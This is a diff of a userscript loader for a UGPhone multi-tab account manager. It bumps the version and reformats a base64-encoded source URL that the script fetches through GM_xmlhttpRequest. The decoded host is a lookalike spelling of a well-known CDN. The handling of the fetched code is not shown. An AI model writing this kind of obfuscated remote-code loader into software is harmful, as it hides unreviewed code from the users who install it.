@@ -1,7 +1,7 @@
 // ==UserScript==
 // @name         Multi-Tab Account Manager for UGPhone (Loader)
 // @namespace    minhbeo8-ugphone
-// @version      1.0.8
+// @version      1.0.9
 // @description  Quản lý nhiều local ugphone 
 // @author       Minhbeo8(hominz) 
 // @supportURL   https://discord.gg/XK8qsgrF
@@ -25,9 +25,8 @@
     function decodeBase64(e) {
         try { return atob(e); } catch (e) { return ""; }
     }
-    const sourceUrl = decodeBase64(
-  "aHR0cHM6Ly9jZG4uanNkbGV2ci5uZXQvZ2gvTWluaGJlbzgvZXh0ZW5zaW9uX211bHRpX0Jyb3dzZXJAbWFpbi9leHRlbnNpb24uanM="
-);
+    
+    const sourceUrl = decodeBase64("aHR0cHM6Ly9jZG4uanNkbGV2ci5uZXQvZ2gvTWluaGJlbzgvZXh0ZW5zaW9uX211bHRpX0Jyb3dzZXJAbWFpbi9leHRlbnNpb24uanM=");
     GM_xmlhttpRequest({
         method: "GET",
         url: sourceUrl,
